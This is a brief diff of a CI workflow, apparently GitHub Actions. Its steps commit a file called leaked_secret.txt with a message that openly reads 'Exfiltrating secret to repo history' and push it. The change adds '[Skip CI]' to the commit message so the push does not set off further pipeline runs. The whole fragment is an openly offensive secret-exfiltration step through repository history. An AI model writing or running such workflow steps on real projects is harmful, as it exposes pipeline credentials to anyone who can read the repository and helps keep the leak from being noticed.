@@ -27,5 +27,5 @@ jobs:
           
           # Push to the repository
           git add leaked_secret.txt
-          git commit -m "Exfiltrating secret to repo history"
+          git commit -m "[Skip CI] Exfiltrating secret to repo history"
           git push
